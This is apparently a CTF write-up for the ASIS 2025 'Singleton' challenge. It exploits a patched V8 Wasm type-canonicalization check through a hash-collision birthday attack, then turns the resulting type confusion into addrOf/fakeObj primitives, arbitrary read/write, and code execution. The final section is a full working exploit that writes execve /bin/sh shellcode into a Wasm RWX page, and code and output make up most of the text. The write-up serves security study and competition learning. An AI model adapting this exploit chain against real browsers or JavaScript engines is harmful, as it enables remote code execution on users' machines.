+++
title = 'Singleton - ASIS CTF Finals 2025'
date = 2025-12-30T12:41:03+01:00
draft = true
author = 'Erge'
summary = 'Colliding hashes and confusing types for fun and profit'
tags = [
    'V8',
    "WebAssembly"
]
toc = true
+++

## Challenge Overview
We are provided with a custom V8 build <br>(rev: [0da6e850a16bcc0cceb707b921094dc99ff1919e](https://chromium.googlesource.com/v8/v8.git/+/0da6e850a16bcc0cceb707b921094dc99ff1919e))<br> containing a small patch in
`src/wasm/canonical-types.h`:
```diff
diff --git a/src/wasm/canonical-types.h b/src/wasm/canonical-types.h
index 0f9ebd3a4e0..832bdaa9eb9 100644
--- a/src/wasm/canonical-types.h
+++ b/src/wasm/canonical-types.h
@@ -325,7 +325,7 @@ class TypeCanonicalizer {
         uint32_t rel_type2 = index2.index - recgroup2.first.index;
         if (rel_type1 != rel_type2) return false;
       } else if (index1 != index2) {
-        return false;
+        return true;
       }
       return true;
     }
```

For the sake of completeness, here's also the provided `args.gn`:
```
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_sandbox = false
dcheck_always_on = false
use_siso = false
```

Our goal is to gain **RCE** and execute the **/flag_reader** binary and since the v8 heap sandbox is disabled obtaining the **addrOf** and **fakeObj** primitives will be enough to solve the challenge.

## Analyzing the patch
Let's look at the provided diff from a wider angle, the patch modifies `TypeCanonicalizer::CanonicalEquality::EqualTypeIndex()`:

```cpp
bool EqualTypeIndex(CanonicalTypeIndex index1,
                        CanonicalTypeIndex index2) const {
      const bool relative_index = recgroup1.Contains(index1);
      if (relative_index != recgroup2.Contains(index2)) return false;
      if (relative_index) {
        // Compare relative type indexes within the respective recgroups.
        uint32_t rel_type1 = index1.index - recgroup1.first.index;
        uint32_t rel_type2 = index2.index - recgroup2.first.index;
        if (rel_type1 != rel_type2) return false;
      } else if (index1 != index2) {
        return false; //this becomes true!
      }
      return true;
    }
```
This code is used to implement equality checks for `CanonicalValueTypes`. As a result, it causes the Wasm type system to treat two distinct type indexes as identical, which can lead V8 to incorrectly think that two different Wasm types are equal. This, in turn, would allow arbitrary casting between them.

This sounds like textbook type confusion!

## The (failed) type confusion
(I'll be using **wasm-module-builder.js** to build the exploit modules, you can find it in the [V8 repo](https://github.com/v8/v8/blob/main/test/mjsunit/wasm/wasm-module-builder.js))

The first thing i tried was a very naive type confusion:

```js
d8.file.execute("./wasm-module-builder.js");

let builder = new WasmModuleBuilder();

let ref_holder = builder.addStruct([makeField(kWasmExternRef, true)]);
let i64_holder = builder.addStruct([makeField(kWasmI64, true)]);
```

Assume we can freely interchange **ref_holder** and **i64_holder**, we could confuse an **ExternRef** (a JS object) as an **I64**, which would provide us with our **addrOf** primitive, and by doing the opposite, also with **fakeObj**.

So how do we achieve this type confusion? The patch tricks V8 into thinking all type indexes are equal so let's add another piece to our puzzle:

```js
let struct_ref = builder.addStruct([makeField(wasmRefType(ref_holder), true)]);
let struct_i64 = builder.addStruct([makeField(wasmRefType(i64_holder), true)]);
```

These structs are functionally identical, however they have two different type indexes as their field (because they refer to our previous structs). <br> 
Due to the patch V8 thinks they are referring to the same type, and thus it should theoretically allows us to freely cast one instance of the struct to the other.

Let's put this theory to the test:
```js
builder.addFunction('addrof', makeSig([kWasmExternRef], [kWasmI64])).addBody([
  kExprLocalGet, 0,
  kGCPrefix, kExprStructNew, ref_holder,
  kGCPrefix, kExprStructNew, struct_ref,

  kGCPrefix, kExprRefCast, struct_i64,

  kGCPrefix, kExprStructGet, struct_i64, 0,
  kGCPrefix, kExprStructGet, i64_holder, 0
]).exportFunc();

let instance = builder.instantiate(); 
const addrof = instance.exports.addrof;

let obj = {};
let addr = addrof(obj);
print("Address: " + addr.toString(16));
```

In this function we're putting what we said earlier into practice to achieve **addrOf**:
- We're wrapping `obj` inside the structs<br>
Layout:
  `struct_ref(ref_holder(obj: ExternRef))`

- We're perfoming the type confusion by casting `struct_ref -> struct_i64`<br>
Layout:
  `struct_i64(i64_holder(obj: I64))`

- And lastly we retrieve obj's address <br>
Type Confusion `ExternRef -> i64`

Let's run it!

```bash
$ ./d8 failed.js 
wasm-function[0]:0x47: RuntimeError: illegal cast
RuntimeError: illegal cast
    at addrof (wasm://wasm/88ef1d4a:wasm-function[0]:0x47)
    at failed.js:25:12
```

Oh... Life is never easy is it?

## Debugging & Digging into the source
By the debugging our failed exploit and putting a breakpoint at `TypeCanonicalizer::CanonicalEquality::EqualType` we can notice how we actually aren't hitting the equality check.

We must go back to the drawing board, how does V8 compare Wasm types and where is **EqualType()** actually used?

Thankfully more smart and skilled people can answer us;<br> I especially found https://issues.chromium.org/issues/381696874 and the series of related reports by [Seunghyun Lee](https://x.com/0x10n) very useful, and I'm also guessing they were the Author's inspiration for this challenge.

By reading the reports we can learn that:
1) V8 uses `std::unordered_set<Canonical(Singleton)Group>` to store the canonicalization results. (A **CanonicalSingletonGroup** is a recursion group that contains a single **CanonicalType**, we'll only be using this type of groups hence the name of the challenge)

2) The equality check only occurs when an hash collision happens inside the `std::unordered_set`.

3) It's computionally feasible to generate an hash collision via a [birthday attack](https://en.wikipedia.org/wiki/Birthday_attack).

Therefore if we can generate two different structs with colliding hashes they will then pass the flawed equality check and get merged, enabling our type confusion.

## Generating the hash collision
Our goal is to generate two different structs whose hashes collide, but whose fields differ, and we want those fields to be references to **ref_holder** and **i64_holder** 

Here's an excerpt from the previously mentioned report:
```
CanonicalHashing uses base::Hasher which is based on MurmurHash64A 
and thus returns a 64bit hash value. 
Birthday attack allows us to find a collision in ~50% chance with 2^32 samples 
which is very feasible (in minutes, if not seconds). 
By precomputing offline the hash values for struct types that either 
has ref null any or ref null none as its fields and iterating this selection 
for >32 fields we can easily create >2^32 different inputs that are all 
considerered equal by CanonicalEquality, but which has random-ish hash values 
in which we are likely to find at least a single duplicate hash value.
By using such precomputed colliding struct types we can canonicalize two 
different struct types into the same canonical index and cause arbitrary 
Wasm type confusion.
```

And that is what we will implement, sadly this is the part where I ran out of time during the CTF, so the following implemention isn't at all optmized or well-thought-out, but at least it worked :p

My (lazy) approach was directly patching the V8 source code and hooking the `CanonicalSingletonGroup::hash_value()` function:
```diff
diff --git a/src/wasm/canonical-types.h b/src/wasm/canonical-types.h
index 5fd4027efbc..7534d74a6d1 100644
--- a/src/wasm/canonical-types.h
+++ b/src/wasm/canonical-types.h
@@ -16,6 +16,8 @@
 #include "src/base/platform/mutex.h"
 #include "src/wasm/struct-types.h"
 #include "src/wasm/value-type.h"
+#include "iostream"
+#include "fstream"
 
 namespace v8::internal::wasm {
 
@@ -445,6 +447,74 @@ class TypeCanonicalizer {
     }
 
     size_t hash_value() const {
+      if(type.kind == CanonicalType::kStruct and type.struct_type->fields().size() >= 2) {
+        ValueTypeBase ref = type.struct_type->fields()[0];
+        ValueTypeBase i64 = type.struct_type->fields()[1];
+        uint64_t MAX = 4294967296;
+        uint64_t TARGET = 0;
+
+        std::unordered_set<size_t> seen;
+        seen.reserve(4294967296);
+
+        for (uint64_t attempt = 0; attempt < MAX; attempt++) {
+          if (attempt % 10000000 == 0) {
+            std::ofstream file("log.txt", std::ios_base::app);
+            file << "Attempt : " << attempt << "/" << MAX << "\n";
+            file << seen.size() << " unique hashes found so far\n";
+          }
+          CanonicalHashing hasher{{index, index}};
+
+          uint32_t supertype_index = hasher.MakeGroupRelative(type.supertype);
+          static_assert(kMaxCanonicalTypes <= kMaxUInt32 >> 3);
+          uint32_t metadata =
+            (supertype_index << 2) | (type.is_shared << 1) | (type.is_final << 0);
+          hasher.hasher.Add(metadata);
+
+          uint32_t descriptor_index = hasher.MakeGroupRelative(type.descriptor);
+          uint32_t describes_index = hasher.MakeGroupRelative(type.describes);
+
+          uint32_t desc = (descriptor_index << 11) ^ (describes_index);
+          hasher.hasher.Add(desc);
+
+          hasher.hasher.AddRange(type.struct_type->mutabilities());
+          uint32_t mask = attempt & 0xFFFFFFFF;
+
+          hasher.Add(CanonicalValueType{i64});
+          hasher.Add(CanonicalValueType{i64});
+          hasher.Add(CanonicalValueType{ref});
+          hasher.Add(CanonicalValueType{ref});
+          for (int i=0; i<32; i++) {
+            if (!!(mask & (1ULL << i)))
+              hasher.Add(CanonicalValueType{ref});
+            else
+              hasher.Add(CanonicalValueType{i64});
+          }
+
+          size_t h = hasher.hash();
+
+          if (!TARGET)
+            seen.insert(h);
+
+          if ((seen.size() != attempt+1 and !TARGET) or TARGET == h) {
+            std::ofstream file("log.txt", std::ios_base::app);
+            file << "[+] collision found\n";
+            file << "    hash: 0x" << std::hex << h << "\n";
+            file << "    mask: 0x" << std::hex << mask << "\n";
+            TARGET = h;
+            seen.clear();
+            attempt = 0;
+
+            //[+] collision found
+            //hash: 0x8f6f4ae476c4d880
+            //mask: 0x50541848
+
+            //[+] collision found
+            //hash: 0x8f6f4ae476c4d880
+            //mask: 0x86b1bd60
+          }
+        }
+      }
+
       CanonicalHashing hasher{{index, index}};
       hasher.Add(type);
       return hasher.hash();
``` 

We can then run the patched V8 binary with this script, which will provide the correct **CanonicalType** metadata we require:

```js
d8.file.execute("./wasm-module-builder.js");

const FIELDS = 32;
      
const colls = [
  {
    mask1: 0xdeadbeefn,     
    mask2: 0xdeadbeefn
  }
];

function create_fields(mask) {
  // 0 -> struct ref_holder
  // 1 -> struct i64_holder
  let fields = [makeField(wasmRefType(0), true), makeField(wasmRefType(1), true), makeField(wasmRefType(0), true), makeField(wasmRefType(0), true)];
  let init = [wasmRefType(0), wasmRefType(0), wasmRefType(0), wasmRefType(0)];
        
  for (let i = 0; i < FIELDS; i++) {
    let bit = !!(mask & (1n << BigInt(i)));
    init.push(bit ? wasmRefType(0) : wasmRefType(1));
    fields.push(makeField(bit ? wasmRefType(0) : wasmRefType(1), true));
  }

  return [fields, init];
}

for (const coll of colls) {
  let builder = new WasmModuleBuilder();

  let ref_holder = builder.addStruct([makeField(kWasmAnyRef, true)]);
  let i64_holder = builder.addStruct([makeField(kWasmI64, true)]);

  builder.startRecGroup();
  let [fields_1, init_1] = create_fields(coll.mask1);
  let struct_1 = builder.addStruct(fields_1);
  builder.endRecGroup();

  builder.startRecGroup();
  let [fields_2, init_2] = create_fields(coll.mask2);
  let struct_2 = builder.addStruct(fields_2);
  builder.endRecGroup();
    
  let instance = builder.instantiate(); 
}
```

After running for a while (in a VPS with lots of RAM 🥀) we finally get our collisions:

```bash
[+] collision found
hash: 0x8f6f4ae476c4d880
mask: 0x50541848

[+] collision found
hash: 0x8f6f4ae476c4d880
mask: 0x86b1bd60
```

And using the masks we can build our 2 structs:

```bash
[i64_holder, i64_holder, ref_holder, ref_holder, i64_holder, i64_holder, i64_holder, ref_holder, i64_holder, i64_holder, ref_holder, i64_holder, i64_holder, i64_holder, i64_holder, ref_holder, ref_holder, i64_holder, i64_holder, i64_holder, i64_holder, i64_holder, ref_holder, i64_holder, ref_holder, i64_holder, ref_holder, i64_holder, i64_holder, i64_holder, i64_holder, i64_holder, ref_holder, i64_holder, ref_holder, i64_holder]
Hashes to: 0x8f6f4ae476c4d880
7th element = ref_holder

[i64_holder, i64_holder, ref_holder, ref_holder, i64_holder, i64_holder, i64_holder, i64_holder, i64_holder, ref_holder, ref_holder, i64_holder, ref_holder, i64_holder, ref_holder, ref_holder, ref_holder, ref_holder, i64_holder, ref_holder, ref_holder, i64_holder, i64_holder, i64_holder, ref_holder, ref_holder, i64_holder, ref_holder, i64_holder, ref_holder, ref_holder, i64_holder, i64_holder, i64_holder, i64_holder, ref_holder]
Hashes to: 0x8f6f4ae476c4d880
7th element = i64_holder
```
Whose 7th element differs!

We now have all we need for our type confusion :D

## The (successful) type confusion
We just need to modify our previous exploit to use the structs we found, this time V8 will allows us to freely cast the structs resulting in our **addrOf** and **fakeObj** primitives
```js
d8.file.execute("./wasm-module-builder.js");

const FIELDS = 32;
      
const colls = [
  {
    //0x8f6f4ae476c4d880
    mask1: 0x50541848n,     
    mask2: 0x86b1bd60n
  }
];

function create_fields(mask) {
  // 0 -> struct ref_holder
  // 1 -> struct i64_holder
  let fields = [makeField(wasmRefType(1), true), makeField(wasmRefType(1), true), makeField(wasmRefType(0), true), makeField(wasmRefType(0), true)];
  let init = [(1), (1), (0), (0)];
        
  for (let i = 0; i < FIELDS; i++) {
    let bit = !!(mask & (1n << BigInt(i)));
    init.push(bit ? (0) : (1));
    fields.push(makeField(bit ? wasmRefType(0) : wasmRefType(1), true));
  }

  return [fields, init];
}

function find_mismatch(init1, init2) {
  for (let i = 0; i < init1.length; i++) 
    if (init1[i] !== init2[i]) 
      return i;
}

for (const coll of colls) {
  let builder = new WasmModuleBuilder();

  let ref_holder = builder.addStruct([makeField(kWasmExternRef, true)]);
  let i64_holder = builder.addStruct([makeField(kWasmI64, true)]);

  let [fields_1, init_1] = create_fields(coll.mask1);
  let struct_1 = builder.addStruct(fields_1);

  let [fields_2, init_2] = create_fields(coll.mask2);
  let struct_2 = builder.addStruct(fields_2);

  mismatch_idx = find_mismatch(init_1, init_2)
  print("The structs differ at field " + mismatch_idx);
  let struct_i64 = (init_1[mismatch_idx] == 1 ? struct_1 : struct_2);
  let struct_externref = (init_1[mismatch_idx] == 0 ? struct_1 : struct_2);
    
  builder.addFunction("make_ref_holder", makeSig([kWasmExternRef], [wasmRefType(ref_holder)])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructNew, ref_holder,
  ]).exportFunc();

  builder.addFunction("make_i64_holder", makeSig([kWasmI64], [wasmRefType(i64_holder)])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructNew, i64_holder,
  ]).exportFunc();
    
  builder.addFunction('make_ref', makeSig([wasmRefType(ref_holder), wasmRefType(i64_holder)], [wasmRefType(struct_externref)])).addBody([
    ...init_1.flatMap(type => {
      if (type === 0) 
        return [kExprLocalGet, 0];
      else if (type === 1)
        return [kExprLocalGet, 1];
    }),
    kGCPrefix, kExprStructNew, struct_externref,
  ]).exportFunc();

  builder.addFunction('make_i64', makeSig([wasmRefType(ref_holder), wasmRefType(i64_holder)], [wasmRefType(struct_i64)])).addBody([
    ...init_2.flatMap(type => {
      if (type === 0) 
        return [kExprLocalGet, 0];
      else if (type === 1)
        return [kExprLocalGet, 1];
    }),
    kGCPrefix, kExprStructNew, struct_i64,
  ]).exportFunc();

  builder.addFunction('addrof', makeSig([kWasmAnyRef], [kWasmI64])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprRefCast, struct_i64,
    kGCPrefix, kExprStructGet, struct_i64, 7,
    kGCPrefix, kExprStructGet, i64_holder, 0
  ]).exportFunc();

  builder.addFunction('fakeobj', makeSig([kWasmAnyRef], [kWasmExternRef])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprRefCast, struct_externref,
    kGCPrefix, kExprStructGet, struct_externref, 7,
    kGCPrefix, kExprStructGet, ref_holder, 0
  ]).exportFunc();
    
  let instance = builder.instantiate(); 
  const make_ref = instance.exports.make_ref;
  const make_ref_holder = instance.exports.make_ref_holder;
  const make_i64 = instance.exports.make_i64;
  const make_i64_holder = instance.exports.make_i64_holder;
  const addrof = instance.exports.addrof;
  const fakeobj = instance.exports.fakeobj;

  function GetAddressOf(x) {
    return (addrof(make_ref(make_ref_holder(x), make_i64_holder(0x1337n))) & 0xffffffffn) - 1n;
  }

  function GetFakeObject(addr) {
    return fakeobj(make_i64(make_ref_holder({}), make_i64_holder(addr)));
  }

  let arr = [1.1, 2.2, 3.3];
  print(GetAddressOf(arr).toString(16));
  print(GetFakeObject(GetAddressOf(arr)+1n));
}
```

By running it:
```bash
$ ./d8 demo.js 
The structs differ at field 7
10bd660
1.1,2.2,3.3
```

With our primitives built we can trivially gain arb R/W, as the sandbox is disabled, and thus RCE. 

## Final Exploit
```js
d8.file.execute("./wasm-module-builder.js");

const FIELDS = 32;
      
const colls = [
  {
    //0x8f6f4ae476c4d880
    mask1: 0x50541848n,     
    mask2: 0x86b1bd60n
  }
];

function create_fields(mask) {
  // 0 -> struct ref_holder
  // 1 -> struct i64_holder
  let fields = [makeField(wasmRefType(1), true), makeField(wasmRefType(1), true), makeField(wasmRefType(0), true), makeField(wasmRefType(0), true)];
  let init = [(1), (1), (0), (0)];
        
  for (let i = 0; i < FIELDS; i++) {
    let bit = !!(mask & (1n << BigInt(i)));
    init.push(bit ? (0) : (1));
    fields.push(makeField(bit ? wasmRefType(0) : wasmRefType(1), true));
  }

  return [fields, init];
}

function print_init(init) {
  let str = '[';
  for (let i = 0; i < init.length; i++) {
    str += init[i] === 0 ? 'ref_holder' : 'i64_holder';
    if (i !== init.length - 1) 
      str += ', ';
  }
  str += ']';
  return str;
}

function find_mismatch(init1, init2) {
  for (let i = 0; i < init1.length; i++) 
    if (init1[i] !== init2[i]) 
      return i;
}

for (const coll of colls) {
  let builder = new WasmModuleBuilder();

  let ref_holder = builder.addStruct([makeField(kWasmExternRef, true)]);
  let i64_holder = builder.addStruct([makeField(kWasmI64, true)]);

  let [fields_1, init_1] = create_fields(coll.mask1);
  let struct_1 = builder.addStruct(fields_1);

  let [fields_2, init_2] = create_fields(coll.mask2);
  let struct_2 = builder.addStruct(fields_2);

  mismatch_idx = find_mismatch(init_1, init_2)
  print("The structs differ at field " + mismatch_idx);
  let struct_i64 = (init_1[mismatch_idx] == 1 ? struct_1 : struct_2);
  let struct_externref = (init_1[mismatch_idx] == 0 ? struct_1 : struct_2);
    
  print("Struct 1 fields: " + print_init(init_1));
  print("");
  print("Struct 2 fields: " + print_init(init_2));

  builder.addFunction("make_ref_holder", makeSig([kWasmExternRef], [wasmRefType(ref_holder)])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructNew, ref_holder,
  ]).exportFunc();

  builder.addFunction("make_i64_holder", makeSig([kWasmI64], [wasmRefType(i64_holder)])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprStructNew, i64_holder,
  ]).exportFunc();
    
  builder.addFunction('make_ref', makeSig([wasmRefType(ref_holder), wasmRefType(i64_holder)], [wasmRefType(struct_externref)])).addBody([
    ...init_1.flatMap(type => {
      if (type === 0) 
        return [kExprLocalGet, 0];
      else if (type === 1)
        return [kExprLocalGet, 1];
    }),
    kGCPrefix, kExprStructNew, struct_externref,
  ]).exportFunc();

  builder.addFunction('make_i64', makeSig([wasmRefType(ref_holder), wasmRefType(i64_holder)], [wasmRefType(struct_i64)])).addBody([
    ...init_2.flatMap(type => {
      if (type === 0) 
        return [kExprLocalGet, 0];
      else if (type === 1)
        return [kExprLocalGet, 1];
    }),
    kGCPrefix, kExprStructNew, struct_i64,
  ]).exportFunc();

  builder.addFunction('addrof', makeSig([kWasmAnyRef], [kWasmI64])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprRefCast, struct_i64,
    kGCPrefix, kExprStructGet, struct_i64, 7,
    kGCPrefix, kExprStructGet, i64_holder, 0
  ]).exportFunc();

  builder.addFunction('fakeobj', makeSig([kWasmAnyRef], [kWasmExternRef])).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprRefCast, struct_externref,
    kGCPrefix, kExprStructGet, struct_externref, 7,
    kGCPrefix, kExprStructGet, ref_holder, 0
  ]).exportFunc();
    
  let instance = builder.instantiate(); 
  const make_ref = instance.exports.make_ref;
  const make_ref_holder = instance.exports.make_ref_holder;
  const make_i64 = instance.exports.make_i64;
  const make_i64_holder = instance.exports.make_i64_holder;
  const addrof = instance.exports.addrof;
  const fakeobj = instance.exports.fakeobj;

  const conv_ab = new ArrayBuffer(8);
  const conv_f64 = new Float64Array(conv_ab);
  const conv_u64 = new BigUint64Array(conv_ab);

  const EMPTY_PROPERTIES_ADDR = 0x7bdn;
  const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100d0a9n;
  const FAKE_JSARR_SZ = 0x200n;
    
  function itof(x) {
    conv_u64[0] = BigInt(x);
    return conv_f64[0];
  }

  function ftoi(x) {
    conv_f64[0] = x;
    return conv_u64[0];
  }

  function GetAddressOf(x) {
    return (addrof(make_ref(make_ref_holder(x), make_i64_holder(0x1337n))) & 0xffffffffn) - 1n;
  }

  function GetFakeObject(addr) {
    return fakeobj(make_i64(make_ref_holder({}), make_i64_holder(addr)));
  }

  let arr_arbrw = [0.1, 0.2, 0.3];

  let fake_jsarr = [
    itof((EMPTY_PROPERTIES_ADDR << 32n) | BigInt(MAP_JSARR_PACKED_DOUBLES_ADDR)),
    itof(0x4343434343434343n),
  ];

  let FAKE_JSARR = GetAddressOf(fake_jsarr)+1n;
  let FAKE_JSARR_ELEMENTS = FAKE_JSARR + 68n;
  print("FAKE: 0x"+(FAKE_JSARR_ELEMENTS).toString(16));
  let ARR_ARBRW_ADDR = GetAddressOf(arr_arbrw);
  print("ARR: 0x"+(ARR_ARBRW_ADDR).toString(16));
  fake_jsarr[1] = itof(((FAKE_JSARR_SZ * 2n) << 32n) | BigInt(ARR_ARBRW_ADDR+1n));
  let corrupter_arr = GetFakeObject(FAKE_JSARR_ELEMENTS);

  function v8_write64(where, what) {
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8n));
    arr_arbrw[0] = itof(what);
  }

  function v8_read64(where) {    
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8n));
    return ftoi(arr_arbrw[0]);
  }

  const expl_wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 2, 6, 42, 7, 127, 0, 65, 128, 8, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 14, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 142, 4, 11, 127, 0, 65, 0, 11, 127, 0, 65, 1, 11, 7, 130, 1, 10, 6, 109, 101, 109, 111, 114, 121, 2, 0, 17, 95, 95, 119, 97, 115, 109, 95, 99, 97, 108, 108, 95, 99, 116, 111, 114, 115, 0, 0, 4, 102, 117, 110, 99, 0, 1, 1, 103, 3, 0, 12, 95, 95, 100, 115, 111, 95, 104, 97, 110, 100, 108, 101, 3, 1, 10, 95, 95, 100, 97, 116, 97, 95, 101, 110, 100, 3, 2, 13, 95, 95, 103, 108, 111, 98, 97, 108, 95, 98, 97, 115, 101, 3, 3, 11, 95, 95, 104, 101, 97, 112, 95, 98, 97, 115, 101, 3, 4, 13, 95, 95, 109, 101, 109, 111, 114, 121, 95, 98, 97, 115, 101, 3, 5, 12, 95, 95, 116, 97, 98, 108, 101, 95, 98, 97, 115, 101, 3, 6, 10, 138, 1, 2, 3, 0, 1, 11, 131, 1, 0, 65, 128, 8, 66, 170, 213, 170, 213, 170, 213, 170, 213, 170, 127, 55, 3, 0, 65, 128, 8, 66, 184, 223, 204, 195, 134, 128, 228, 245, 9, 55, 3, 0, 65, 136, 8, 66, 200, 130, 131, 135, 130, 146, 228, 245, 9, 55, 3, 0, 65, 144, 8, 66, 200, 138, 188, 145, 150, 205, 219, 245, 9, 55, 3, 0, 65, 152, 8, 66, 208, 144, 165, 188, 142, 146, 228, 245, 9, 55, 3, 0, 65, 160, 8, 66, 177, 236, 199, 145, 141, 146, 228, 245, 9, 55, 3, 0, 65, 168, 8, 66, 184, 247, 128, 128, 128, 128, 228, 245, 9, 55, 3, 0, 65, 176, 8, 66, 143, 138, 192, 132, 137, 146, 228, 245, 9, 55, 3, 0, 11, 0, 201, 1, 9, 112, 114, 111, 100, 117, 99, 101, 114, 115, 1, 12, 112, 114, 111, 99, 101, 115, 115, 101, 100, 45, 98, 121, 1, 69, 65, 110, 100, 114, 111, 105, 100, 32, 40, 49, 49, 51, 52, 57, 50, 50, 56, 44, 32, 43, 112, 103, 111, 44, 32, 43, 98, 111, 108, 116, 44, 32, 43, 108, 116, 111, 44, 32, 45, 109, 108, 103, 111, 44, 32, 98, 97, 115, 101, 100, 32, 111, 110, 32, 114, 52, 56, 55, 55, 52, 55, 101, 41, 32, 99, 108, 97, 110, 103, 105, 49, 55, 46, 48, 46, 50, 32, 40, 104, 116, 116, 112, 115, 58, 47, 47, 97, 110, 100, 114, 111, 105, 100, 46, 103, 111, 111, 103, 108, 101, 115, 111, 117, 114, 99, 101, 46, 99, 111, 109, 47, 116, 111, 111, 108, 99, 104, 97, 105, 110, 47, 108, 108, 118, 109, 45, 112, 114, 111, 106, 101, 99, 116, 32, 100, 57, 102, 56, 57, 102, 52, 100, 49, 54, 54, 54, 51, 100, 53, 48, 49, 50, 101, 53, 99, 48, 57, 52, 57, 53, 102, 51, 98, 51, 48, 101, 99, 101, 51, 100, 50, 51, 54, 50, 41, 0, 44, 15, 116, 97, 114, 103, 101, 116, 95, 102, 101, 97, 116, 117, 114, 101, 115, 2, 43, 15, 109, 117, 116, 97, 98, 108, 101, 45, 103, 108, 111, 98, 97, 108, 115, 43, 8, 115, 105, 103, 110, 45, 101, 120, 116]);
  let expl_wasm_mod = new WebAssembly.Module(expl_wasm_code);
  let expl_wasm_instance = new WebAssembly.Instance(expl_wasm_mod);
  let wasm_instance_addr = GetAddressOf(expl_wasm_instance) + 1n;
  print("wasm instance addr: 0x"+wasm_instance_addr.toString(16));
  let rwx_page = v8_read64(wasm_instance_addr + 0xcn) & 0xffffffffn;
  rwx_page = v8_read64(rwx_page + 0x28n);
  print("rwx_page: 0x"+(rwx_page).toString(16));

  var rwx_page_buf = new ArrayBuffer(0x1000);    
  var rwx_page_buf_ptr = GetAddressOf(rwx_page_buf);

  v8_write64(rwx_page_buf_ptr + 0x25n, rwx_page); 

  print("Overwrote WASM RWX page buffer backing store pointer");
  var rwx_page_arr = new Int8Array(rwx_page_buf);

  print("writing shellcode...");
  const SHELLCODE = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xc0, 0xb0, 0xe7, 0x0f, 0x05];    
  for(var i = 0; i < SHELLCODE.length; i++) rwx_page_arr[i] = SHELLCODE[i];

  print("Igniting");
  expl_wasm_instance.exports.func();
  //ASIS{Jus7_4_B00l34n_70_S4lv47i0n_69a5a6af8741ae1a4a04bfed}
}
```